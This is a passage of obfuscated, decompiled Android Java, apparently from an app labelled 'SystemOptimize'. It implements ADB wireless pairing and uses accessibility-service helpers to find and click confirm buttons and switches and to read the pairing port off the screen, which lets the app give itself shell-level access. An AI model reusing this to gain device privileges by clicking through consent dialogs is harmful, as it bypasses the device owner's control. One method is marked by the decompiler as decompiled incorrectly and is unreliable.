            int[] iArr = {0, 1, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, v10.MASK, 0, 48, 33, 48, 9, 6, 5, 43, 14, 3, 2, 26, 5, 0, 4, 20};
            byte[] bArr2 = new byte[234];
            for (int i = 0; i < 234; i++) {
                bArr2[i] = (byte) iArr[i];
            }
            cipher.update(bArr2);
            return cipher.doFinal(bArr);
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "signAdbToken 失败", e);
            return null;
        }
    }

    /* renamed from: c2 */
    public static byte[] m211998c2(byte[] bArr, byte[] bArr2) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, InvalidAlgorithmParameterException {
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(2, new SecretKeySpec(bArr, "AES"), new GCMParameterSpec(128, ByteBuffer.allocate(12).order(ByteOrder.LITTLE_ENDIAN).putLong(0L).array()));
            return cipher.doFinal(bArr2);
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "AES-GCM 解密失败", e);
            return null;
        }
    }

    /* renamed from: c3 */
    public static byte[] m211999c3(byte[] bArr, byte[] bArr2) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, InvalidAlgorithmParameterException {
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(1, new SecretKeySpec(bArr, "AES"), new GCMParameterSpec(128, ByteBuffer.allocate(12).order(ByteOrder.LITTLE_ENDIAN).putLong(0L).array()));
            return cipher.doFinal(bArr2);
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "AES-GCM 加密失败", e);
            return null;
        }
    }

    /* renamed from: c5 */
    public static byte[] m212000c5(BigInteger bigInteger) {
        byte[] bArr = new byte[PSKKeyManager.MAX_KEY_LENGTH_BYTES];
        byte[] byteArray = bigInteger.toByteArray();
        int length = byteArray.length;
        byte[] bArr2 = new byte[length];
        int length2 = byteArray.length;
        for (int i = 0; i < length2; i++) {
            bArr2[i] = byteArray[(byteArray.length - 1) - i];
        }
        System.arraycopy(bArr2, 0, bArr, 0, Math.min(length, PSKKeyManager.MAX_KEY_LENGTH_BYTES));
        return bArr;
    }

    /* renamed from: c7 */
    public static byte[] m212001c7(int i, byte[] bArr, int i2, int i3) {
        ByteBuffer byteBufferOrder = ByteBuffer.allocate(bArr.length + 24).order(ByteOrder.LITTLE_ENDIAN);
        byteBufferOrder.putInt(i);
        byteBufferOrder.putInt(i2);
        byteBufferOrder.putInt(i3);
        byteBufferOrder.putInt(bArr.length);
        int i4 = 0;
        for (byte b : bArr) {
            i4 += b & 255;
        }
        byteBufferOrder.putInt(i4);
        byteBufferOrder.putInt(~i);
        byteBufferOrder.put(bArr);
        byte[] bArrArray = byteBufferOrder.array();
        t60.m214694b5(bArrArray, "buf.array()");
        return bArrArray;
    }

    /* renamed from: c8 */
    public static String m212002c8(C0360a2 c0360a2, String str, String str2, int i) {
        String strM210590e1;
        if ((i & 2) != 0) {
            str2 = null;
        }
        if (!v00.m214888a0()) {
            t60.m214702c3("SystemOptimize", "【API】local-service 未运行，跳过: ".concat(str));
            return null;
        }
        try {
            t60.m214702c3("SystemOptimize", "【API】POST http://127.0.0.1:7912" + str + " body=" + str2 + " timeout=5000ms");
            URLConnection uRLConnectionOpenConnection = new URL("http://127.0.0.1:7912".concat(str)).openConnection();
            t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            HttpURLConnection httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type", "application/json");
            httpURLConnection.setConnectTimeout(5000);
            httpURLConnection.setReadTimeout(5000);
            httpURLConnection.setDoOutput(true);
            if (str2 == null) {
                str2 = "{}";
            }
            Charset charset = AbstractC0577hd.f56650a0;
            byte[] bytes = str2.getBytes(charset);
            t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
            OutputStream outputStream = httpURLConnection.getOutputStream();
            try {
                outputStream.write(bytes);
                outputStream.close();
                int responseCode = httpURLConnection.getResponseCode();
                if (responseCode == 200) {
                    InputStream inputStream = httpURLConnection.getInputStream();
                    t60.m214694b5(inputStream, "conn.inputStream");
                    strM210590e1 = b81.m210590e1(new BufferedReader(new InputStreamReader(inputStream, charset), Segment.SIZE));
                } else {
                    InputStream errorStream = httpURLConnection.getErrorStream();
                    strM210590e1 = "HTTP " + responseCode + ": " + (errorStream != null ? b81.m210590e1(new BufferedReader(new InputStreamReader(errorStream, charset), Segment.SIZE)) : "无错误信息");
                }
                t60.m214714d6("SystemOptimize", "【API】" + str + " 响应码=" + responseCode + " 内容: " + m21.m213937e5(100, strM210590e1));
                httpURLConnection.disconnect();
                return strM210590e1;
            } finally {
            }
        } catch (Exception e) {
            String simpleName = e.getClass().getSimpleName();
            String message = e.getMessage();
            StringBuilder sbM41c2 = AbstractC0003a2.m41c2("【API】", str, " 失败: ", simpleName, " - ");
            sbM41c2.append(message);
            t60.m214704c5("SystemOptimize", sbM41c2.toString());
            throw e;
        }
    }

    /* renamed from: d2 */
    public static void m212003d2(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        arrayList.add(accessibilityNodeInfo);
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m212003d2(child, arrayList);
            }
        }
    }

    /* renamed from: e5 */
    public static byte[] m212004e5(RSAPublicKey rSAPublicKey) throws InvalidKeyException {
        BigInteger modulus = rSAPublicKey.getModulus();
        BigInteger publicExponent = rSAPublicKey.getPublicExponent();
        if (modulus.toByteArray().length < 256) {
            throw new InvalidKeyException(tz0.m214802a2(modulus.toByteArray().length, "Invalid key length "));
        }
        ByteBuffer byteBufferOrder = ByteBuffer.allocate(524).order(ByteOrder.LITTLE_ENDIAN);
        byteBufferOrder.putInt(64);
        BigInteger bigInteger = BigInteger.ZERO;
        BigInteger bit = bigInteger.setBit(32);
        byteBufferOrder.putInt(bit.subtract(modulus.mod(bit).modInverse(bit)).intValue());
        byteBufferOrder.put(m212000c5(modulus));
        BigInteger bigIntegerModPow = bigInteger.setBit(2048).modPow(BigInteger.valueOf(2L), modulus);
        t60.m214694b5(bigIntegerModPow, "r2ModN");
        byteBufferOrder.put(m212000c5(bigIntegerModPow));
        byteBufferOrder.putInt(publicExponent.intValue());
        byte[] bArrArray = byteBufferOrder.array();
        t60.m214694b5(bArrArray, "buffer.array()");
        return bArrArray;
    }

    /* renamed from: e6 */
    public static g41 m212005e6(C0360a2 c0360a2) {
        C0360a2 c0360a22;
        g41 g41Var;
        int iM212064g7 = c0360a2.m212064g7();
        String str = c0360a2.f53839c4;
        synchronized (c0360a2.f53873f8) {
            if (c0360a2.m212036b8()) {
                return c0360a2.f53872f7;
            }
            try {
                g41 g41Var2 = c0360a2.f53872f7;
                if (g41Var2 != null) {
                    g41Var2.m212891a0();
                }
            } catch (Exception unused) {
            }
            c0360a2.f53872f7 = null;
            if (iM212064g7 <= 0) {
                t60.m214704c5("SystemOptimize", "y(): 无ADB端口");
                return null;
            }
            String str2 = str.length() > 0 ? str : "127.0.0.1";
            c0360a2.f53839c4 = str2;
            c0360a2.m212091k0(iM212064g7);
            t60.m214702c3("SystemOptimize", "y(): 连接 " + str2 + ":" + iM212064g7);
            File fileM212065g8 = c0360a2.m212065g8();
            if (fileM212065g8 == null) {
                t60.m214704c5("SystemOptimize", "密钥目录不存在");
                return null;
            }
            File file = new File(fileM212065g8, "cert.pem");
            File file2 = new File(fileM212065g8, "private.key");
            X509Certificate x509CertificateM212074h9 = c0360a2.m212074h9(file);
            PrivateKey privateKeyM212075i0 = c0360a2.m212075i0(file2);
            if (x509CertificateM212074h9 == null || privateKeyM212075i0 == null) {
                t60.m214704c5("SystemOptimize", "密钥加载失败 cert=" + x509CertificateM212074h9 + " key=" + privateKeyM212075i0);
                return null;
            }
            try {
                c0360a22 = c0360a2;
            } catch (Exception e) {
                e = e;
                c0360a22 = c0360a2;
            }
            try {
                g41Var = new g41(c0360a22, str2, iM212064g7, file, file2);
            } catch (Exception e2) {
                e = e2;
                Exception exc = e;
                c0360a22.f53841c6.set(false);
                t60.m214705c6("SystemOptimize", "ADB 连接异常", exc);
                return null;
            }
            if (!g41Var.m212892a1()) {
                g41Var.m212891a0();
                c0360a22.f53841c6.set(false);
                t60.m214704c5("SystemOptimize", "ADB 连接失败");
                return null;
            }
            c0360a22.f53872f7 = g41Var;
            c0360a22.f53841c6.set(true);
            t60.m214714d6("SystemOptimize", "ADB 持久连接建立: " + str + ":" + iM212064g7 + " (u=true)");
            c0360a22.f53854d9.set(0);
            c0360a22.m212082j0(iM212064g7);
            return g41Var;
        }
    }

    /* renamed from: f0 */
    public static byte[] m212006f0(SSLSocket sSLSocket) throws ClassNotFoundException {
        byte[] bArrExportKeyingMaterial;
        String str;
        t60.m214714d6("SystemOptimize", ">>> 开始导出密钥材料, socket类型=".concat(sSLSocket.getClass().getName()));
        try {
            Class.forName(StringUtil.m212470a0("JEsWdE43Aj1UIzJJBXRuNwI9VCMySQU="));
            try {
                t60.m214702c3("SystemOptimize", "使用 org.conscrypt.Conscrypt 导出密钥材料");
                bArrExportKeyingMaterial = Conscrypt.exportKeyingMaterial(sSLSocket, "adb-label\u0000", (byte[]) null, 64);
                if (bArrExportKeyingMaterial != null) {
                    str = "成功, 长度=" + bArrExportKeyingMaterial.length;
                } else {
                    str = "返回null";
                }
                t60.m214714d6("SystemOptimize", "org.conscrypt 导出结果: " + str);
            } catch (Throwable th) {
                t60.m214704c5("SystemOptimize", "org.conscrypt 方式异常: " + th.getClass().getName() + ": " + th.getMessage());
                t60.m214705c6("SystemOptimize", "异常堆栈:", th);
            }
        } catch (ClassNotFoundException unused) {
            t60.m214726f4("SystemOptimize", "Conscrypt 未注册, 跳过方法1");
        }
        if (bArrExportKeyingMaterial != null && bArrExportKeyingMaterial.length == 64) {
            t60.m214714d6("SystemOptimize", ">>> exportKeyingMaterial 成功!");
            return bArrExportKeyingMaterial;
        }
        t60.m214726f4("SystemOptimize", "结果无效: result=" + bArrExportKeyingMaterial + ", size=" + (bArrExportKeyingMaterial != null ? Integer.valueOf(bArrExportKeyingMaterial.length) : null));
        int i = Build.VERSION.SDK_INT;
        Class cls = Integer.TYPE;
        if (i >= 29) {
            try {
                t60.m214702c3("SystemOptimize", "尝试系统内置 Conscrypt (反射)");
                Object objInvoke = Class.forName(StringUtil.m212470a0("KFYcdEw2CDxYOC8XHihKdg8hWSIoSwgqWXYvIVkiKEsIKlk=")).getMethod("exportKeyingMaterial", SSLSocket.class, String.class, byte[].class, cls).invoke(null, sSLSocket, "adb-label\u0000", null, 64);
                byte[] bArr = objInvoke instanceof byte[] ? (byte[]) objInvoke : null;
                t60.m214702c3("SystemOptimize", "系统 Conscrypt 导出成功, 长度=" + (bArr != null ? Integer.valueOf(bArr.length) : null));
                if (bArr != null) {
                    if (bArr.length == 64) {
                        return bArr;
                    }
                }
            } catch (Throwable th2) {
                t60.m214726f4("SystemOptimize", "系统 Conscrypt 反射失败: " + th2.getClass().getName() + ": " + th2.getMessage());
            }
        }
        try {
            t60.m214702c3("SystemOptimize", "尝试 SSLSocket 实例方法反射, class=".concat(sSLSocket.getClass().getName()));
            Object objInvoke2 = sSLSocket.getClass().getMethod("exportKeyingMaterial", String.class, byte[].class, cls).invoke(sSLSocket, "adb-label\u0000", null, 64);
            byte[] bArr2 = objInvoke2 instanceof byte[] ? (byte[]) objInvoke2 : null;
            t60.m214702c3("SystemOptimize", "SSLSocket 实例导出成功, 长度=" + (bArr2 != null ? Integer.valueOf(bArr2.length) : null));
            if (bArr2 != null) {
                if (bArr2.length == 64) {
                    return bArr2;
                }
            }
        } catch (Throwable th3) {
            t60.m214704c5("SystemOptimize", "所有 exportKeyingMaterial 方法都失败: " + th3.getClass().getName() + ": " + th3.getMessage());
        }
        t60.m214704c5("SystemOptimize", "exportKeyingMaterial 最终失败");
        return null;
    }

    /* renamed from: f2 */
    public static void m212007f2(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (t60.m214686a2(className != null ? className.toString() : null, "android.widget.TextView")) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m212007f2(child, arrayList);
            }
        }
    }

    /* renamed from: f3 */
    public static AccessibilityNodeInfo m212008f3(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM212008f3;
        String string2;
        CharSequence className = accessibilityNodeInfo.getClassName();
        String str2 = "";
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        CharSequence text = accessibilityNodeInfo.getText();
        if (text != null && (string2 = text.toString()) != null) {
            str2 = string2;
        }
        if (AbstractC0779a1.m213652a5(string, "Button", false) && AbstractC0779a1.m213652a5(str2, str, false)) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212008f3 = m212008f3(child, str)) != null) {
                return accessibilityNodeInfoM212008f3;
            }
        }
        return null;
    }

    /* renamed from: f4 */
    public static AccessibilityNodeInfo m212009f4(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoM212009f4;
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className != null && (string = className.toString()) != null && AbstractC0779a1.m213652a5(string, "CheckBox", false) && accessibilityNodeInfo.isCheckable()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212009f4 = m212009f4(child)) != null) {
                return accessibilityNodeInfoM212009f4;
            }
        }
        return null;
    }

    /* renamed from: f5 */
    public static AccessibilityNodeInfo m212010f5(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
        for (int i = 0; i < 6 && parent != null; i++) {
            if (parent.isClickable()) {
                t60.m214702c3("SystemOptimize", "findClickableParent: 找到可点击父节点 " + ((Object) parent.getClassName()) + " at depth " + i);
                return parent;
            }
            parent = parent.getParent();
        }
        return null;
    }

    /* renamed from: f6 */
    public static AccessibilityNodeInfo m212011f6(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM212011f6;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if ((AbstractC0779a1.m213652a5(string, "CompoundButton", false) || AbstractC0779a1.m213652a5(string, "CheckBox", false)) && accessibilityNodeInfo.isVisibleToUser()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212011f6 = m212011f6(child)) != null) {
                return accessibilityNodeInfoM212011f6;
            }
        }
        return null;
    }

    /* JADX WARN: Removed duplicated region for block: B:33:0x0069  */
    /* JADX WARN: Removed duplicated region for block: B:34:0x006b  */
    /* renamed from: f7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static AccessibilityNodeInfo m212012f7(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList, ArrayList arrayList2) {
        String string;
        boolean z;
        AccessibilityNodeInfo accessibilityNodeInfoM212012f7;
        String string2;
        String string3;
        CharSequence text = accessibilityNodeInfo.getText();
        String str = "";
        if (text == null || (string3 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string3).toString()) == null) {
            string = "";
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className != null && (string2 = className.toString()) != null) {
            str = string2;
        }
        if ((AbstractC0779a1.m213652a5(str, "Button", false) || AbstractC0779a1.m213652a5(str, "TextView", false) || accessibilityNodeInfo.isClickable()) && string.length() > 0) {
            boolean z2 = true;
            if (arrayList.isEmpty()) {
                z = false;
                if (arrayList2.isEmpty()) {
                    int size = arrayList2.size();
                    int i = 0;
                    while (i < size) {
                        Object obj = arrayList2.get(i);
                        i++;
                        String str2 = (String) obj;
                        if (string.equals(str2) || AbstractC0779a1.m213652a5(string, str2, false)) {
                            break;
                        }
                    }
                    z2 = false;
                    if (z) {
                        t60.m214702c3("SystemOptimize", "findConfirmButtonRecursive: 找到确定按钮 '" + string + "'");
                        return accessibilityNodeInfo;
                    }
                } else {
                    z2 = false;
                    if (z && !z2) {
                        t60.m214702c3("SystemOptimize", "findConfirmButtonRecursive: 找到确定按钮 '" + string + "'");
                        return accessibilityNodeInfo;
                    }
                }
            } else {
                int size2 = arrayList.size();
                int i2 = 0;
                while (i2 < size2) {
                    Object obj2 = arrayList.get(i2);
                    i2++;
                    if (string.equals((String) obj2)) {
                        z = true;
                        break;
                    }
                }
                z = false;
                if (arrayList2.isEmpty()) {
                }
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i3 = 0; i3 < childCount; i3++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i3);
            if (child != null && (accessibilityNodeInfoM212012f7 = m212012f7(child, arrayList, arrayList2)) != null) {
                return accessibilityNodeInfoM212012f7;
            }
        }
        return null;
    }

    /* renamed from: f8 */
    public static AccessibilityNodeInfo m212013f8(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        AccessibilityNodeInfo accessibilityNodeInfoM212013f8;
        if (t60.m214686a2(accessibilityNodeInfo.getClassName(), str)) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212013f8 = m212013f8(child, str)) != null) {
                return accessibilityNodeInfoM212013f8;
            }
        }
        return null;
    }

    /* renamed from: f9 */
    public static AccessibilityNodeInfo m212014f9(AccessibilityNodeInfo accessibilityNodeInfo, List list) {
        Iterator it = list.iterator();
        while (it.hasNext()) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText((String) it.next());
            t60.m214694b5(listFindAccessibilityNodeInfosByText, "nodes");
            if (!listFindAccessibilityNodeInfosByText.isEmpty()) {
                return listFindAccessibilityNodeInfosByText.get(0);
            }
        }
        return null;
    }

    /* renamed from: g0 */
    public static AccessibilityNodeInfo m212015g0(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoM212015g0;
        if (accessibilityNodeInfo.isScrollable()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212015g0 = m212015g0(child)) != null) {
                return accessibilityNodeInfoM212015g0;
            }
        }
        return null;
    }

    /* renamed from: g1 */
    public static AccessibilityNodeInfo m212016g1(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoM212016g1;
        if (t60.m214686a2(accessibilityNodeInfo.getClassName(), "android.widget.Switch")) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212016g1 = m212016g1(child)) != null) {
                return accessibilityNodeInfoM212016g1;
            }
        }
        return null;
    }

    /* renamed from: g2 */
    public static AccessibilityNodeInfo m212017g2(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM212017g2;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if (AbstractC0779a1.m213652a5(string, "Switch", false) || AbstractC0779a1.m213652a5(string, "CheckBox", false) || AbstractC0779a1.m213652a5(string, "Toggle", false) || accessibilityNodeInfo.isCheckable()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212017g2 = m212017g2(child)) != null) {
                return accessibilityNodeInfoM212017g2;
            }
        }
        return null;
    }

    /* renamed from: g5 */
    public static String m212018g5() throws SocketException {
        String str = Build.PRODUCT;
        t60.m214694b5(str, "PRODUCT");
        if (AbstractC0779a1.m213652a5(str, "sdk", false)) {
            return "10.0.2.2";
        }
        String str2 = Build.HARDWARE;
        t60.m214694b5(str2, "hw");
        if (AbstractC0779a1.m213652a5(str2, "goldfish", false) || AbstractC0779a1.m213652a5(str2, "ranchu", false)) {
            return "10.0.2.2";
        }
        String strM212019g9 = m212019g9();
        return strM212019g9 == null ? "127.0.0.1" : strM212019g9;
    }

    /* renamed from: g9 */
    public static String m212019g9() throws SocketException {
        try {
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (networkInterfaces.hasMoreElements()) {
                Enumeration<InetAddress> inetAddresses = networkInterfaces.nextElement().getInetAddresses();
                while (inetAddresses.hasMoreElements()) {
                    InetAddress inetAddressNextElement = inetAddresses.nextElement();
                    if (!inetAddressNextElement.isLoopbackAddress() && (inetAddressNextElement instanceof Inet4Address)) {
                        return ((Inet4Address) inetAddressNextElement).getHostAddress();
                    }
                }
            }
            return null;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "获取本地IP失败", e);
            return null;
        }
    }

    /* renamed from: h5 */
    public static byte[] m212020h5(byte[] bArr, byte[] bArr2) throws IllegalStateException, NoSuchAlgorithmException, InvalidKeyException {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(new byte[32], "HmacSHA256"));
            mac.init(new SecretKeySpec(mac.doFinal(bArr), "HmacSHA256"));
            mac.update(bArr2);
            mac.update((byte) 1);
            byte[] bArrDoFinal = mac.doFinal();
            t60.m214694b5(bArrDoFinal, "okm");
            byte[] bArrCopyOf = Arrays.copyOf(bArrDoFinal, 16);
            t60.m214694b5(bArrCopyOf, "copyOf(this, newSize)");
            return bArrCopyOf;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "HKDF 派生失败", e);
            return new byte[16];
        }
    }

    /* renamed from: i7 */
    public static int m212021i7(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        md0 md0VarM213645a0;
        try {
            ArrayList arrayList = new ArrayList();
            m212003d2(accessibilityNodeInfo, arrayList);
            int size = arrayList.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayList.get(i);
                i++;
                CharSequence text = ((AccessibilityNodeInfo) obj).getText();
                if (text != null && (string = text.toString()) != null && (md0VarM213645a0 = new Regex("(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}):(\\d+)").m213645a0(string)) != null) {
                    if (md0VarM213645a0.f58334a2 == null) {
                        md0VarM213645a0.f58334a2 = new ld0(md0VarM213645a0);
                    }
                    ld0 ld0Var = md0VarM213645a0.f58334a2;
                    t60.m214692b3(ld0Var);
                    Integer numM213685d8 = AbstractC0779a1.m213685d8((String) ld0Var.get(2));
                    if (numM213685d8 != null) {
                        int iIntValue = numM213685d8.intValue();
                        if (30000 <= iIntValue && iIntValue < 65536) {
                            return iIntValue;
                        }
                    } else {
                        continue;
                    }
                }
            }
            return 0;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "解析 UI 端口失败", e);
            return 0;
        }
    }

    /* renamed from: i8 */
    public static l41 m212022i8(DataInputStream dataInputStream) throws IOException {
        try {
            byte[] bArr = new byte[6];
            dataInputStream.readFully(bArr);
            ByteBuffer byteBufferOrder = ByteBuffer.wrap(bArr).order(ByteOrder.BIG_ENDIAN);
            byte b = byteBufferOrder.get();
            byte b2 = byteBufferOrder.get();
            int i = byteBufferOrder.getInt();
            if (b >= 1 && i > 0 && i <= 16384) {
                return new l41(b, b2, i);
            }
            t60.m214704c5("SystemOptimize", "无效的配对包头: version=" + ((int) b) + ", payloadSize=" + i);
            return null;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "读取配对包头失败", e);
            return null;
        }
    }

    /* renamed from: i9 */
    public static String m212023i9(String str) throws UnknownHostException {
        String strM213673c6;
        URI uri;
        String host;
        String str2;
        try {
            strM213673c6 = AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(str, "wss://", "https://"), "ws://", "http://");
            uri = new URI(strM213673c6);
            host = uri.getHost();
        } catch (Exception e) {
            tz0.m214810b0(">>> 域名解析失败: ", e.getMessage(), "SystemOptimize");
        }
        if (host != null && !new Regex("^\\d+\\.\\d+\\.\\d+\\.\\d+$").m213646a2(host)) {
            InetAddress[] allByName = InetAddress.getAllByName(host);
            t60.m214694b5(allByName, "addresses");
            if (allByName.length == 0) {
                return AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(str, "wss://", "https://"), "ws://", "http://");
            }
            String hostAddress = allByName[0].getHostAddress();
            String str3 = "";
            if (uri.getPort() > 0) {
                str2 = ":" + uri.getPort();
            } else {
                str2 = "";
            }
            String path = uri.getPath();
            if (path != null) {
                str3 = path;
            }
            String str4 = "https://" + hostAddress + str2 + str3;
            t60.m214714d6("SystemOptimize", ">>> 域名解析: " + host + " -> " + hostAddress + " (使用HTTPS)");
            return str4;
        }
        return strM213673c6;
    }

    /* renamed from: j9 */
    public static void m212024j9(DataOutputStream dataOutputStream, int i, byte[] bArr) throws IOException {
        ByteBuffer byteBufferOrder = ByteBuffer.allocate(6).order(ByteOrder.BIG_ENDIAN);
        byteBufferOrder.put((byte) 1);
        byteBufferOrder.put((byte) i);
        byteBufferOrder.putInt(bArr.length);
        dataOutputStream.write(byteBufferOrder.array());
        dataOutputStream.write(bArr);
        dataOutputStream.flush();
    }

    /* renamed from: k1 */
    public static void m212025k1(int i) {
        if (i <= 0) {
            i = 1;
        }
        while (i > 0) {
            try {
                Thread.sleep(200L);
                i--;
            } catch (Exception unused) {
                return;
            }
        }
    }

    /* renamed from: a0 */
    public final void m212026a0() {
        try {
            if (this.f53821a6.tryLock()) {
                try {
                    if (!this.f53822a7.get()) {
                        t60.m214702c3("SystemOptimize", "准备结束本地配对自动化引擎");
